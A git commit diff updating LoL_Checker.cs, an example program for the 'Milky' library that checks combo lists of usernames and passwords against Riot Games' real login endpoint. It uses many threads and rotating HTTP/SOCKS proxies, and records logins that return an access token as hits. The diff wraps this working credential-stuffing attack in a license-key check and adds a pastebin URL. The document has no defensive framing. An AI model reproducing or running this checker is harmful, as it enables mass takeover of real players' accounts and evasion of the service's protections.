a29d742bac28c5e251cf5a2cd62452166cc9e02a
Matt <33204743+Laiteux@users.noreply.github.com>
2019-05-08 16:13:03 +1100

    Update LoL_Checker.cs

--- Examples/LoL_Checker.cs
+++ Examples/LoL_Checker.cs
@@ -12,69 +12,77 @@ namespace LoL_Checker
         static void Main(string[] args)
         {
             MilkyManager Milky = new MilkyManager();
-            Milky.ProgramManager.Initialize("LoL Checker", "Example", "Laiteux");
+            Milky.ProgramManager.Initialize("LoL Checker", "1.0.0", "Laiteux", "https://pastebin.com/raw/QW82zeqi");
 
-            Milky.FileUtils.LoadCombos(ComboType.UsernamePassword);
-            Milky.FileUtils.LoadProxies();
-
-            int threads = Milky.UserUtils.AskInteger("Threads");
-            Milky.RunSettings.threads = threads;
-            ThreadPool.SetMinThreads(threads, threads);
-
-            Milky.RunSettings.proxyProtocol = Milky.UserUtils.AskChoice("Proxy Protocol", new string[] { "HTTP", "SOCKS4", "SOCKS5" });
-
-            string region = Milky.UserUtils.AskChoice("Region", new string[] { "BR1", "EUN1", "EUW1", "JP1", "KR", "LA1", "LA2", "NA1", "OC1", "PBE1", "RU", "TR1" });
-
-            Milky.ConsoleSettings.runningTitleFormat =
-                $"%program.name% %program.version% by %program.author% - Running | " +
-                $"Region : {region} | " +
-                $"Ran : %run.ran% (%run.ran.percentage%) - Remaining : %run.remaining% - Hits : %run.hits% (%run.hits.percentage%) | " +
-                $"RPM : %statistics.rpm% - Elapsed : %statistics.elapsed% - Estimated : %statistics.estimated%";
-            Milky.ConsoleSettings.finishedTitleFormat =
-                $"%program.name% %program.version% by %program.author% - Finished |" +
-                $"Region : {region} | " +
-                $"Ran : %run.ran% - Hits : %run.hits% (%run.hits.percentage%) | " +
-                $"Elapsed : %statistics.elapsed%";
-
-            Milky.RunManager.StartRun();
-
-            Parallel.ForEach(Milky.RunLists.combos, new ParallelOptions { MaxDegreeOfParallelism = Milky.RunSettings.threads }, combo =>
+            if (Milky.Authentication.Authenticate("ExampleKey"))
             {
-                string[] splittedCombo = combo.Split(':');
+                Milky.FileUtils.LoadCombos();
+                Milky.FileUtils.LoadProxies();
 
-                OutputType outputType = OutputType.Invalid;
+                int threads = Milky.UserUtils.AskInteger("Threads");
+                Milky.RunSettings.threads = threads;
+                ThreadPool.SetMinThreads(threads, threads);
 
-                if (splittedCombo.Length == 2)
+                Milky.RunSettings.proxyProtocol = Milky.UserUtils.AskChoice("Proxy Protocol", new string[] { "HTTP", "SOCKS4", "SOCKS5" });
+
+                string region = Milky.UserUtils.AskChoice("Region", new string[] { "BR1", "EUN1", "EUW1", "JP1", "KR", "LA1", "LA2", "NA1", "OC1", "PBE1", "RU", "TR1" });
+
+                Milky.ConsoleSettings.runningTitleFormat =
+                    $"%program.name% %program.version% by %program.author% - Running | " +
+                    $"Region : {region} | " +
+                    $"Ran : %run.ran% (%run.ran.percentage%) - Remaining : %run.remaining% - Hits : %run.hits% (%run.hits.percentage%) | " +
+                    $"RPM : %statistics.rpm% - Elapsed : %statistics.elapsed% - Estimated : %statistics.estimated%";
+                Milky.ConsoleSettings.finishedTitleFormat =
+                    $"%program.name% %program.version% by %program.author% - Finished |" +
+                    $"Region : {region} | " +
+                    $"Ran : %run.ran% - Hits : %run.hits% (%run.hits.percentage%) | " +
+                    $"Elapsed : %statistics.elapsed%";
+
+                Milky.RunManager.StartRun();
+
+                Parallel.ForEach(Milky.RunLists.combos, new ParallelOptions { MaxDegreeOfParallelism = Milky.RunSettings.threads }, combo =>
                 {
-                    string login = splittedCombo[0];
-                    string password = splittedCombo[1];
+                    string[] splittedCombo = combo.Split(':');
 
-                    while (outputType != OutputType.Hit)
+                    OutputType outputType = OutputType.Invalid;
+
+                    if (splittedCombo.Length == 2)
                     {
-                        try
+                        string login = splittedCombo[0];
+                        string password = splittedCombo[1];
+
+                        while (outputType != OutputType.Hit)
                         {
-                            MilkyRequest request = Milky.RequestUtils.SetProxy(new MilkyRequest());
-                            request.AddHeader("Content-Type", "application/x-www-form-urlencoded");
+                            try
+                            {
+                                MilkyRequest request = Milky.RequestUtils.SetProxy(new MilkyRequest());
+                                request.AddHeader("Content-Type", "application/x-www-form-urlencoded");
 
-                            string response = Milky.RequestUtils.Execute(request,
-                                HttpMethod.POST, "https://auth.riotgames.com/token",
-                                $"client_assertion_type=urn%3Aietf%3Aparams%3Aoauth%3Aclient-assertion-type%3Ajwt-bearer&client_assertion=eyJhbGciOiJSUzI1NiJ9.eyJhdWQiOiJodHRwczpcL1wvYXV0aC5yaW90Z2FtZXMuY29tXC90b2tlbiIsInN1YiI6ImxvbCIsImlzcyI6ImxvbCIsImV4cCI6MTYwMTE1MTIxNCwiaWF0IjoxNTM4MDc5MjE0LCJqdGkiOiIwYzY3OThmNi05YTgyLTQwY2ItOWViOC1lZTY5NjJhOGUyZDcifQ.dfPcFQr4VTZpv8yl1IDKWZz06yy049ANaLt-AKoQ53GpJrdITU3iEUcdfibAh1qFEpvVqWFaUAKbVIxQotT1QvYBgo_bohJkAPJnZa5v0-vHaXysyOHqB9dXrL6CKdn_QtoxjH2k58ZgxGeW6Xsd0kljjDiD4Z0CRR_FW8OVdFoUYh31SX0HidOs1BLBOp6GnJTWh--dcptgJ1ixUBjoXWC1cgEWYfV00-DNsTwer0UI4YN2TDmmSifAtWou3lMbqmiQIsIHaRuDlcZbNEv_b6XuzUhi_lRzYCwE4IKSR-AwX_8mLNBLTVb8QzIJCPR-MGaPL8hKPdprgjxT0m96gw&grant_type=password&username={region}|{Uri.EscapeDataString(login)}&password={Uri.EscapeDataString(password)}&scope=openid").ToString();
+                                string response = Milky.RequestUtils.Execute(request,
+                                    HttpMethod.POST, "https://auth.riotgames.com/token",
+                                    $"client_assertion_type=urn%3Aietf%3Aparams%3Aoauth%3Aclient-assertion-type%3Ajwt-bearer&client_assertion=eyJhbGciOiJSUzI1NiJ9.eyJhdWQiOiJodHRwczpcL1wvYXV0aC5yaW90Z2FtZXMuY29tXC90b2tlbiIsInN1YiI6ImxvbCIsImlzcyI6ImxvbCIsImV4cCI6MTYwMTE1MTIxNCwiaWF0IjoxNTM4MDc5MjE0LCJqdGkiOiIwYzY3OThmNi05YTgyLTQwY2ItOWViOC1lZTY5NjJhOGUyZDcifQ.dfPcFQr4VTZpv8yl1IDKWZz06yy049ANaLt-AKoQ53GpJrdITU3iEUcdfibAh1qFEpvVqWFaUAKbVIxQotT1QvYBgo_bohJkAPJnZa5v0-vHaXysyOHqB9dXrL6CKdn_QtoxjH2k58ZgxGeW6Xsd0kljjDiD4Z0CRR_FW8OVdFoUYh31SX0HidOs1BLBOp6GnJTWh--dcptgJ1ixUBjoXWC1cgEWYfV00-DNsTwer0UI4YN2TDmmSifAtWou3lMbqmiQIsIHaRuDlcZbNEv_b6XuzUhi_lRzYCwE4IKSR-AwX_8mLNBLTVb8QzIJCPR-MGaPL8hKPdprgjxT0m96gw&grant_type=password&username={region}|{Uri.EscapeDataString(login)}&password={Uri.EscapeDataString(password)}&scope=openid").ToString();
 
-                            request.Dispose();
+                                request.Dispose();
 
-                            if (response.Contains("access_token"))
-                                outputType = OutputType.Hit;
-                            else if (response.Contains("invalid_credentials"))
-                                break;
+                                if (response.Contains("access_token"))
+                                    outputType = OutputType.Hit;
+                                else if (response.Contains("invalid_credentials"))
+                                    break;
+                            }
+                            catch { }
                         }
-                        catch { }
                     }
-                }
 
-                Milky.RunManager.SubmitComboResult(combo, outputType);
-            });
+                    Milky.RunManager.SubmitComboResult(combo, outputType);
+                });
 
-            Milky.RunManager.FinishRun();
+                Milky.RunManager.FinishRun();
+            }
+            else
+            {
+                Milky.ConsoleUtils.Exit("Couldn't authenticate to Milky Library");
+            }
+
             Thread.Sleep(-1);
         }
     }
